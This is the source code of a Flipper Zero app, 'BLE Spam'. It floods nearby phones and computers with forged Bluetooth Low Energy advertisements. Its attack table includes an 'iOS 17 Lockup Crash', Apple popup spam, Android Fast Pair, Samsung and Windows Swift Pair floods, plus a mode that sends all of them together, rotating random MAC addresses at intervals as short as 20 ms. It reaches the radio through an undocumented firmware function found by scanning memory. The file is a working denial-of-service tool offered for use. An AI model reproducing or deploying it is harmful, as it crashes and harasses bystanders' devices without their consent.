#include "ble_spam.h"
#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include "protocols/_protocols.h"

// Hacked together by @Willy-JL
// Custom adv API by @Willy-JL (idea by @xMasterX)
// iOS 17 Crash by @ECTO-1A
// Android, Samsung and Windows Pairs by @Spooks4576 and @ECTO-1A
// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576

// NAPI FUNCTIONS BY NO PROTO FOR OFW API COMPATIBILITY
// TODO: Use __attribute__((aligned(2))) instead?
// TODO: Use an offset of the base address?

#define TAG "FuriHalBt"
#define BLE_STATUS_TIMEOUT 0xFFU
#define BLE_CMD_MAX_PARAM_LEN 255

typedef uint8_t tBleStatus;

typedef __PACKED_STRUCT {
    uint8_t Adv_Data_Length;
    uint8_t Adv_Data[BLE_CMD_MAX_PARAM_LEN - 1];
}
aci_gap_additional_beacon_set_data_cp0;

typedef __PACKED_STRUCT {
    uint16_t Adv_Interval_Min;
    uint16_t Adv_Interval_Max;
    uint8_t Adv_Channel_Map;
    uint8_t Own_Address_Type;
    uint8_t Own_Address[6];
    uint8_t PA_Level;
}
aci_gap_additional_beacon_start_cp0;

struct hci_request {
    uint16_t ogf;
    uint16_t ocf;
    int event;
    void* cparam;
    int clen;
    void* rparam;
    int rlen;
};

#define HCI_SEND_REQ_ADDR 0x080161e8
#define TARGET_SEQUENCE 0x33680446
#define SEQUENCE_OFFSET 6
#define START_ADDR 0x8000140
#define END_ADDR 0x80800ec

uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
    uint8_t* addr;
    uint8_t* target_bytes = (uint8_t*)&sequence;

    for(addr = (uint8_t*)START_ADDR; addr < (uint8_t*)END_ADDR - 3; addr++) {
        if(addr[0] == target_bytes[3] && addr[1] == target_bytes[2] &&
           addr[2] == target_bytes[1] && addr[3] == target_bytes[0]) {
            return (uintptr_t*)(addr - SEQUENCE_OFFSET);
        }
    }
    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to 0.90.1 OFW offset
}

int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;

void* Osal_MemCpy(void* dest, const void* src, unsigned int size) {
    return memcpy(dest, src, size);
}

void* Osal_MemSet(void* ptr, int value, unsigned int size) {
    return memset(ptr, value, size);
}

tBleStatus aci_gap_additional_beacon_start(
    uint16_t Adv_Interval_Min,
    uint16_t Adv_Interval_Max,
    uint8_t Adv_Channel_Map,
    uint8_t Own_Address_Type,
    const uint8_t* Own_Address,
    uint8_t PA_Level) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_start_cp0* cp0 = (aci_gap_additional_beacon_start_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Interval_Min = Adv_Interval_Min;
    index_input += 2;
    cp0->Adv_Interval_Max = Adv_Interval_Max;
    index_input += 2;
    cp0->Adv_Channel_Map = Adv_Channel_Map;
    index_input += 1;
    cp0->Own_Address_Type = Own_Address_Type;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Own_Address, (const void*)Own_Address, 6);
    index_input += 6;
    cp0->PA_Level = PA_Level;
    index_input += 1;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b0;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_stop(void) {
    struct hci_request rq;
    tBleStatus status = 0;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b1;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_set_data(uint8_t Adv_Data_Length, const uint8_t* Adv_Data) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_set_data_cp0* cp0 =
        (aci_gap_additional_beacon_set_data_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Data_Length = Adv_Data_Length;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Adv_Data, (const void*)Adv_Data, Adv_Data_Length);
    index_input += Adv_Data_Length;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b2;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

bool napi_furi_hal_bt_custom_adv_set(const uint8_t* adv_data, size_t adv_len) {
    tBleStatus status = aci_gap_additional_beacon_set_data(adv_len, adv_data);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_set failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_set success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_start(
    uint16_t min_interval,
    uint16_t max_interval,
    uint8_t mac_type,
    const uint8_t mac_addr[GAP_MAC_ADDR_SIZE],
    uint8_t power_amp_level) {
    tBleStatus status = aci_gap_additional_beacon_start(
        (double)(min_interval / 0.625), // Millis to gap time
        (double)(max_interval / 0.625), // Millis to gap time
        0b00000111, // All 3 channels
        mac_type,
        mac_addr,
        power_amp_level);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_start failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_start success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_stop() {
    tBleStatus status = aci_gap_additional_beacon_stop();
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_stop failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_stop success");
        return true;
    }
}

static Attack attacks[] = {
    {
        .title = "+ Kitchen Sink",
        .text = "Flood all attacks at once",
        .protocol = NULL,
        .payload =
            {
                .random_mac = true,
                .cfg = {},
            },
    },
    {
        .title = "iOS 17 Lockup Crash",
        .text = "Newer iPhones, long range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeCustomCrash,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Action Modal",
        .text = "Lock cooldown, long range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeNearbyAction,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Device Popup",
        .text = "No cooldown, close range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeProximityPair,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Android Device Pair",
        .text = "Reboot cooldown, long range",
        .protocol = &protocol_fastpair,
        .payload =
            {
                .random_mac = true,
                .cfg =
                    {
                        .fastpair = {},
                    },
            },
    },
    {
        .title = "Samsung Earbuds Pair",
        .text = "No cooldown, long range",
        .protocol = &protocol_smartthings,
        .payload =
            {
                .random_mac = true,
                .cfg =
                    {
                        .smartthings = {},
                    },
            },
    },
    {
        .title = "Windows Device Found",
        .text = "Requires enabling SwiftPair",
        .protocol = &protocol_swiftpair,
        .payload =
            {
                .random_mac = true,
                .cfg =
                    {
                        .swiftpair = {},
                    },
            },
    },
};

#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))

static uint16_t delays[] = {20, 50, 100, 200};

typedef struct {
    Ctx ctx;
    bool resume;
    bool advertising;
    uint8_t delay;
    FuriThread* thread;
    int8_t index;
} State;

static int32_t adv_thread(void* _ctx) {
    State* state = _ctx;
    uint8_t size;
    uint16_t delay;
    uint8_t* packet;
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    Payload* payload = &attacks[state->index].payload;
    const Protocol* protocol = attacks[state->index].protocol;
    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));

    while(state->advertising) {
        if(protocol) {
            protocol->make_packet(&size, &packet, &payload->cfg);
        } else {
            protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
        }
        napi_furi_hal_bt_custom_adv_set(packet, size);
        free(packet);

        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
        delay = delays[state->delay];
        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
        napi_furi_hal_bt_custom_adv_stop();
    }

    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        if(state->resume) furi_hal_bt_start_advertising();
    } else {
        state->resume = furi_hal_bt_is_active();
        furi_hal_bt_stop_advertising();
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (-3)
#define PAGE_MAX ATTACKS_COUNT
enum {
    PageHelpApps = PAGE_MIN,
    PageHelpDelay,
    PageHelpDistance,
    PageStart = 0,
    PageEnd = ATTACKS_COUNT - 1,
    PageAboutCredits = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* _ctx) {
    State* state = *(State**)_ctx;
    const char* back = "Back";
    const char* next = "Next";
    if(state->index < 0) {
        back = "Next";
        next = "Back";
    }
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ? &attacks[state->index] : NULL;
    const Payload* payload = attack ? &attack->payload : NULL;
    const Protocol* protocol = attack ? attack->protocol : NULL;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 4 - !protocol, 3, protocol ? protocol->icon : &I_ble_spam);
    canvas_draw_str(canvas, 14, 12, "BLE Spam");

    switch(state->index) {
    case PageHelpApps:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageHelpDelay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageHelpDistance:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageAboutCredits:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam: \e#WillyJL\e#\n"
            "Apple+Crash: \e#ECTO-1A\e#\n"
            "Android+Win: \e#Spooks4576\e#\n"
            "                                   Version \e#3.0\e#",
            false);
        break;
    default: {
        if(!attack) break;
        char str[32];

        canvas_set_font(canvas, FontPrimary);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontPrimary);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            ATTACKS_COUNT,
            protocol ? protocol->get_name(&payload->cfg) : "Everything");
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 34, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static bool input_callback(InputEvent* input, void* _ctx) {
    View* view = _ctx;
    State* state = *(State**)view_get_model(view);
    bool consumed = false;

    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        consumed = true;

        bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
        bool advertising = state->advertising;

        switch(input->key) {
        case InputKeyOk:
            if(is_attack) {
                if(input->type == InputTypeLong) {
                    if(advertising) toggle_adv(state);
                    state->ctx.attack = &attacks[state->index];
                    scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
                    scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
                } else if(input->type == InputTypeShort) {
                    toggle_adv(state);
                }
            }
            break;
        case InputKeyUp:
            if(is_attack && state->delay < COUNT_OF(delays) - 1) {
                state->delay++;
            }
            break;
        case InputKeyDown:
            if(is_attack && state->delay > 0) {
                state->delay--;
            }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state);
            consumed = false;
            break;
        default:
            break;
        }
    }

    view_commit_model(view, consumed);
    return consumed;
}

static bool back_event_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    return scene_manager_handle_back_event(ctx->scene_manager);
}

int32_t ble_spam(void* p) {
    UNUSED(p);
    State* state = malloc(sizeof(State));
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 4096);
    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);

    Gui* gui = furi_record_open(RECORD_GUI);
    state->ctx.view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(state->ctx.view_dispatcher);
    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, &state->ctx);
    view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
    state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);

    View* view_main = view_alloc();
    view_allocate_model(view_main, ViewModelTypeLockFree, sizeof(State*));
    with_view_model(
        view_main, State * *model, { *model = state; }, false);
    view_set_context(view_main, view_main);
    view_set_draw_callback(view_main, draw_callback);
    view_set_input_callback(view_main, input_callback);
    view_dispatcher_add_view(state->ctx.view_dispatcher, ViewMain, view_main);

    state->ctx.byte_input = byte_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewByteInput, byte_input_get_view(state->ctx.byte_input));

    state->ctx.submenu = submenu_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewSubmenu, submenu_get_view(state->ctx.submenu));

    state->ctx.text_input = text_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewTextInput, text_input_get_view(state->ctx.text_input));

    state->ctx.variable_item_list = variable_item_list_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewVariableItemList,
        variable_item_list_get_view(state->ctx.variable_item_list));

    view_dispatcher_attach_to_gui(state->ctx.view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    scene_manager_next_scene(state->ctx.scene_manager, SceneMain);
    view_dispatcher_run(state->ctx.view_dispatcher);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewByteInput);
    byte_input_free(state->ctx.byte_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewSubmenu);
    submenu_free(state->ctx.submenu);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewTextInput);
    text_input_free(state->ctx.text_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewVariableItemList);
    variable_item_list_free(state->ctx.variable_item_list);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewMain);
    view_free(view_main);

    scene_manager_free(state->ctx.scene_manager);
    view_dispatcher_free(state->ctx.view_dispatcher);
    furi_record_close(RECORD_GUI);

    furi_thread_free(state->thread);
    free(state);
    return 0;
}
